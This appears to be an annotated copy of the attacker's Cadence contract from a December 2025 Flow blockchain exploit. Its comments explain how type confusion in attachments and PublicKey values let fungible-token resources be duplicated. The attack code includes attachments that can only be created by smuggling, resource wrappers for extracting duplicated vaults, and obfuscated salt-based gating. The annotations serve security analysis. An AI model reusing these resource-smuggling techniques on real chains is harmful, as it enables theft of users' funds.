/**
 * NFTFactory.cdc - Core exploit contract for the December 27, 2025 Flow attack
 * 
 * This contract was part of a sophisticated Type Confusion Attack that exploited
 * three vulnerabilities in the Cadence runtime (v1.8.8):
 * 
 * 1. ATTACHMENT IMPORT VALIDATION BYPASS: Attachments could be imported with fields
 *    containing incorrect runtime types that weren't validated against static types.
 * 
 * 2. BUILT-IN TYPE DEFENSIVE CHECK BYPASS: The runtime skipped deep validation on
 *    built-in types like PublicKey, allowing resources to hide inside value types.
 * 
 * 3. CONTRACT INITIALIZER SEMANTICS EXPLOIT: Contract deployment didn't verify that
 *    static types of initializer arguments matched parameter types, allowing
 *    copy semantics to be applied to resources (which should use move semantics).
 * 
 * The attack allowed the attacker to DUPLICATE fungible token resources (which should
 * be impossible in Cadence's resource-oriented model), resulting in ~$3.9M extracted.
 * 
 * See: https://flow.com/post/dec-27-technical-post-mortem
 */
access(all) contract NFTFactory {

    access(self) var currentIndex: UInt
    
    /**
     * Salt is computed from the deploying account's address.
     * This acts as an AUTHORIZATION CHECK - only transactions from the attacker's
     * account will have a matching salt, preventing others from using these contracts.
     * The transaction verifies: computedSalt == NFTFactory.salt
     */
    access(all) var salt: UInt
    access(self) let factoryMetadata: {UInt: UInt}

    /**
     * EXPLOIT PART 1: KeyManager Attachment
     * 
     * Attachments in Cadence allow extending types with new functionality.
     * The critical detail: attachment fields were NOT fully validated during argument import.
     * 
     * The attacker exploited this by sending malformed transaction arguments where:
     * - The attachment was declared with certain static types
     * - But the actual runtime values had DIFFERENT types
     * 
     * CRITICAL: The init() calls panic("0") - this means KeyManager can NEVER be
     * created through normal code execution. It could ONLY be created via the exploit
     * by smuggling it through malformed transaction arguments that bypassed validation.
     * The panic() is proof this attachment was designed solely for exploitation.
     */
    access(all) attachment KeyManager for AnyStruct {
        access(all) var keyList: KeyList

        access(all) fun getKeyList(refSelf: &KeyManager): KeyList {
            var tempKeyList = KeyList()
            refSelf.keyList <-> tempKeyList
            return tempKeyList
        }

        init() {
            self.keyList = KeyList()
            panic("0")  // EXPLOIT MARKER: Normal creation is impossible
        }
    }

    /**
     * EXPLOIT PART 2: KeyList with PublicKey
     * 
     * KeyList contains an array of PublicKey - a BUILT-IN TYPE that is partially
     * user-constructible. The Cadence runtime skipped deep defensive checks on
     * built-in types since they're normally only created by the runtime itself.
     * 
     * The attacker exploited this by:
     * - Declaring a value as PublicKey
     * - Encoding a RESOURCE-CONTAINING structure in its place
     * 
     * Because PublicKey is partially user-constructible, the runtime:
     * - Skipped deep validation
     * - Allowed a resource type to exist inside a value type (struct)
     * 
     * This enabled "resource smuggling" - hiding resources inside struct contexts
     * where they would be treated with COPY semantics instead of MOVE semantics.
     */
    access(all) struct KeyList {
        access(all) var keys: [PublicKey]  // Built-in type used to bypass defensive checks

        init() {
            self.keys = []
        }
    }

    access(all) struct EmptyStruct {}

    /**
     * ResourceWrapper - Utility for wrapping any resource
     * 
     * This wrapper allows resources to be passed as generic @AnyResource types.
     * In the attack, it was used to wrap the duplicated FungibleToken.Vault resources
     * so they could be extracted after the type confusion exploit.
     */
    access(all) resource ResourceWrapper {
        access(all) var resource: @[AnyResource]

        access(all) fun unwrap(): @AnyResource {
            return <- self.resource.removeFirst()
        }

        init(argResource: @AnyResource) {
            self.resource <- [<- argResource]
        }
    }

    /**
     * ResourceManager - Manages wrapped resources with swap semantics
     * 
     * The swap operator (<->) is used to extract the wrapper while replacing it
     * with an empty one. This is a legitimate Cadence pattern, but was used
     * here to handle the duplicated resources after the exploit.
     */
    access(all) resource ResourceManager {
        access(all) var rawValue: @ResourceWrapper

        access(all) fun getWrapper(): @ResourceWrapper {
            var tempWrapper <- create ResourceWrapper(argResource: <- [])
            self.rawValue <-> tempWrapper
            return <- tempWrapper
        }

        init(wrapper: @ResourceWrapper) {
            self.rawValue <- wrapper
        }
    }

    access(all) fun wrapResource(argResource: @AnyResource): @ResourceWrapper {
        return <- create ResourceWrapper(argResource: <- argResource)
    }

    access(all) fun createManager(wrapper: @ResourceWrapper): @ResourceManager {
        return <- create ResourceManager(wrapper: <- wrapper)
    }

    /**
     * EXPLOIT PART 1 (continued): SignatureValidator Attachment
     * 
     * Another attachment used in the type confusion chain.
     * Contains a reference to ResourceManager, creating a path for the
     * duplicated resources to be accessed.
     * 
     * CRITICAL: Like KeyManager, init() calls panic("1") - proving this
     * attachment was designed ONLY for exploitation. Normal creation is impossible.
     */
    access(all) attachment SignatureValidator for AnyStruct {
        access(all) var signatureAlgorithm: &ResourceManager

        access(all) fun setSignatureAlgorithm(refSelf: &SignatureValidator, ref: &ResourceManager) {
            refSelf.signatureAlgorithm = ref
        }

        init(ref: &ResourceManager) {
            self.signatureAlgorithm = ref
            panic("1")  // EXPLOIT MARKER: Normal creation is impossible
        }
    }

    /**
     * Storage path for the NFT pool where duplicated resources are stored
     */
    access(all) fun getStoragePath(): StoragePath {
        return StoragePath(identifier: "nftpool")!
    }

    /**
     * getMetadataValue - Obfuscated index calculation
     * 
     * This function uses XOR operations to compute an index into factoryMetadata.
     * 
     * Breakdown of the math:
     * - key = 0x13e7a630506419d5 (magic constant)
     * - (salt ^ key ^ 0xffffffffffffffff) performs double XOR
     * - Adding 1 and right-shifting by 64 bits (>> 64) effectively:
     *   - Returns 0 if no overflow occurred
     *   - Returns 1 if overflow occurred
     * 
     * This is obfuscation that makes the code harder to analyze while also
     * potentially selecting different code paths based on the deploying account.
     * The index determines which value from factoryMetadata is used.
     */
    access(self) fun getMetadataValue(): UInt {
        let key: UInt = 0x13e7a630506419d5
        let index = (((self.salt ^ key ^ 0xffffffffffffffff) + 1) >> 64)
        return self.factoryMetadata[index]!
    }

    access(self) fun initializeIndex() {
        self.currentIndex = self.getMetadataValue()
    }

    /**
     * Contract initializer - Sets up address-based authorization
     * 
     * The salt computation creates a unique fingerprint from the deploying account:
     * - Takes the account address as bytes
     * - Converts to UInt
     * - Multiplies by magic number 0x2dc7e1f786ac4e01
     * - Masks to 64 bits with & 0xffffffffffffffff
     * 
     * This ensures that:
     * 1. Only the original deploying account can use rogue_mint.cdc (salt must match)
     * 2. The contract behavior is tied to a specific account address
     * 3. Others cannot simply copy these contracts and use them
     * 
     * The factoryMetadata values (0xab8d79837ca9e79c, etc.) are likely additional
     * obfuscation or configuration values used in the attack chain.
     */
    init() {
        self.currentIndex = 0
        self.factoryMetadata = {
            1: 0xab8d79837ca9e79c,
            2: 0x54a47930f6cb3dc4,
            3: 0x8a6c0dbd3aef1bff
        }
        // ADDRESS-BASED AUTHORIZATION: Salt is derived from deployer's address
        // Only the attacker's account produces a salt that matches NFTFactory.salt
        self.salt = (UInt.fromBigEndianBytes(self.account.address.toBytes())! * 0x2dc7e1f786ac4e01) & 0xffffffffffffffff
        NFTFactory.initializeIndex()
    }
}
